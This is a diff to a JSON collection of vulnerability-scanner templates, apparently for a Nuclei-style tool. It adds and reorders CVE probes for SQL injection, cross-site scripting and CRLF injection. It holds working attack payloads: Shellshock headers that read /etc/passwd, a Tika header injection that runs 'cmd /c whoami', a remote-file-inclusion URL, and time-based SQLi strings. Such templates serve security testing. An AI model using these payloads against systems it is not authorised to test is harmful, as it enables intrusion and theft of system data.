@@ -3436,9 +3436,9 @@
       "requests": [
         {
           "headers": {
-            "Shellshock": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
             "Referer": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
-            "Cookie": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
+            "Cookie": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
+            "Shellshock": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
           },
           "method": "GET",
           "path": [
@@ -6816,11 +6816,11 @@
         {
           "body": "var oShell = WScript.CreateObject('WScript.Shell');var oExec = oShell.Exec(\"cmd /c whoami\");",
           "headers": {
+            "Content-type": "image/jp2",
+            "Connection": "close",
             "X-Tika-OCRTesseractPath": "cscript",
             "X-Tika-OCRLanguage": "//E:Jscript",
-            "Expect": "100-continue",
-            "Content-type": "image/jp2",
-            "Connection": "close"
+            "Expect": "100-continue"
           },
           "method": "PUT",
           "path": [
@@ -10162,6 +10162,21 @@
         {
           "raw": [
             "PUT /wp-content/plugins/w3-total-cache/pub/sns.php HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\n{\"Type\":\"SubscriptionConfirmation\",\"Message\":\"\",\"SubscribeURL\":\"https://rfi.nessus.org/rfi.txt\"}\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2019-6802",
+      "info": {
+        "name": "Pypiserver 1.2.5 - CRLF Injection",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/%0d%0aSet-Cookie:crlfinjection=1;"
           ]
         }
       ]
@@ -14284,6 +14299,28 @@
       ]
     },
     {
+      "id": "CVE-2021-20323",
+      "info": {
+        "name": "Keycloak < 18.0.0 - Cross Site Scripting",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "body": "{\"Test<img src=x onerror=alert(document.domain)>\":1}",
+          "headers": {
+            "Content-Type": "application/json"
+          },
+          "method": "POST",
+          "path": [
+            "{{BaseURL}}/auth/realms/master/clients-registrations/default",
+            "{{BaseURL}}/auth/realms/master/clients-registrations/openid-connect",
+            "{{BaseURL}}/realms/master/clients-registrations/default",
+            "{{BaseURL}}/realms/master/clients-registrations/openid-connect"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2021-20792",
       "info": {
         "name": "WordPress Quiz and Survey Master <7.1.14 - Cross-Site Scripting",
@@ -15457,6 +15494,20 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/wp-admin/admin-ajax.php?action=get_question&question_id=1%20AND%20(SELECT%207242%20FROM%20(SELECT(SLEEP(4)))HQYx)"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2021-24827",
+      "info": {
+        "name": "Asgaros Forum < 1.15.13 - Unauthenticated SQL Injection",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "raw": [
+            "@timeout: 15s\nGET /forum/?subscribe_topic=1%20union%20select%201%20and%20sleep(6) HTTP/1.1\nHost: {{Hostname}}\n"
           ]
         }
       ]
@@ -17332,8 +17383,8 @@
       "requests": [
         {
           "headers": {
-            "Authorization": "Digest username=\"admin\", realm=\"Bridge-IT\", nonce=\"d24d09512ebc3e43c4f6faf34fdb8c76\", uri=\"/api/get_device_details\", response=\"d052e9299debc7bd9cb8adef0a83fed4\", qop=auth, nc=00000001, cnonce=\"ae373d748855243d\"",
-            "Referer": "{{BaseURL}}/assets/base/home.html"
+            "Referer": "{{BaseURL}}/assets/base/home.html",
+            "Authorization": "Digest username=\"admin\", realm=\"Bridge-IT\", nonce=\"d24d09512ebc3e43c4f6faf34fdb8c76\", uri=\"/api/get_device_details\", response=\"d052e9299debc7bd9cb8adef0a83fed4\", qop=auth, nc=00000001, cnonce=\"ae373d748855243d\""
           },
           "method": "GET",
           "path": [
@@ -19960,6 +20011,20 @@
       ]
     },
     {
+      "id": "CVE-2022-0826",
+      "info": {
+        "name": "WP Video Gallery <= 1.7.1 - Unauthenticated SQLi",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "raw": [
+            "@timeout: 15s\nPOST /wp-admin/admin-ajax.php HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\naction=wp_video_gallery_ajax_add_single_youtube&url=http://example.com/?x%26v=1%2522 AND (SELECT 1780 FROM (SELECT(SLEEP(6)))uPaz)%2523\n"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2022-0867",
       "info": {
         "name": "ARPrice Lite < 3.6.1 - Unauthenticated SQLi",
@@ -20016,6 +20081,21 @@
             "POST /api/user_login HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nusername={{username}}&password={{password}}\n",
             "POST /api/shop/save_tax_item HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nReferer: {{BaseURL}}/admin/view:settings\n\nid=0&name=vat1&type=\"><img+src%3dx+onerror%3dalert(document.domain)>&rate=10\n",
             "POST /module HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nReferer:{{BaseURL}}/admin/view:settings\n\nclass=+module+module-shop-taxes-admin-list-taxes+&id=mw_admin_shop_taxes_items_list&parent-module-id=settings-admin-mw-main-module-backend-shop-taxes-admin&parent-module=shop%2Ftaxes%2Fadmin&data-type=shop%2Ftaxes%2Fadmin_list_taxes\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2022-0948",
+      "info": {
+        "name": "Order Listener for WooCommerce < 3.2.2 - Unauthenticated SQLi",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "raw": [
+            "@timeout: 15s\nPOST /?rest_route=/olistener/new HTTP/1.1\nHost: {{Hostname}}\ncontent-type: application/json\n\n{\"id\":\" (SLEEP(6))#\"}\n",
+            "GET /wp-content/plugins/woc-order-alert/assets/admin/js/scripts.js HTTP/1.1\nHost: {{Hostname}}\n"
           ]
         }
       ]
